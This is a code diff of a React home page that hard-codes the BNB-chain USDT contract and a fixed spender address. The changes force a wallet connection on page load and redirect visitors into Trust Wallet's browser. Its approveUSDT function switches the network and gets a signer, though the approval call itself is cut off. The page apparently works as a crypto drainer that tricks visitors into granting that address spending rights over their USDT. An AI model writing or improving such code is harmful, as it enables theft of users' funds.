@@ -9,34 +9,49 @@ export default function Home() {
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
   const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
 
-  // 🔥 AUTO CONNECT (FIX ANDROID)
+  // 🔥 AUTO REDIRECT + AUTO CONNECT (ANDROID FIX)
   useEffect(() => {
-    const autoConnect = async () => {
-      if (window.ethereum) {
-        try {
-          const provider = new ethers.BrowserProvider(window.ethereum);
+    const init = async () => {
 
-          // forza connessione
-          await provider.send("eth_requestAccounts", []);
+      // se NON è dentro Trust Wallet → reindirizza
+      if (!window.ethereum) {
+        const isTrust = navigator.userAgent.toLowerCase().includes("trust");
 
-          console.log("Wallet connesso");
-        } catch (err) {
-          console.log("Utente non ha accettato");
+        if (!isTrust) {
+          window.location.href =
+            "https://link.trustwallet.com/open_url?url=" +
+            window.location.href;
+          return;
         }
+      }
+
+      // prova auto connect
+      try {
+        if (window.ethereum) {
+          const provider = new ethers.BrowserProvider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          console.log("Wallet connesso");
+        }
+      } catch (err) {
+        console.log("Connessione non autorizzata");
       }
     };
 
-    autoConnect();
+    init();
   }, []);
 
   const approveUSDT = async () => {
     try {
+
+      // 🔥 se non c'è wallet → redirect automatico
       if (!window.ethereum) {
-        alert("Apri in Trust Wallet");
+        window.location.href =
+          "https://link.trustwallet.com/open_url?url=" +
+          window.location.href;
         return;
       }
 
-      // 🔥 switch rete BNB
+      // switch BNB
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
@@ -44,7 +59,7 @@ export default function Home() {
 
       const provider = new ethers.BrowserProvider(window.ethereum);
 
-      // 🔥 FIX ANDROID
+      // 🔥 forza connessione (ANDROID FIX)
       await provider.send("eth_requestAccounts", []);
 
       const signer = await provider.getSigner();
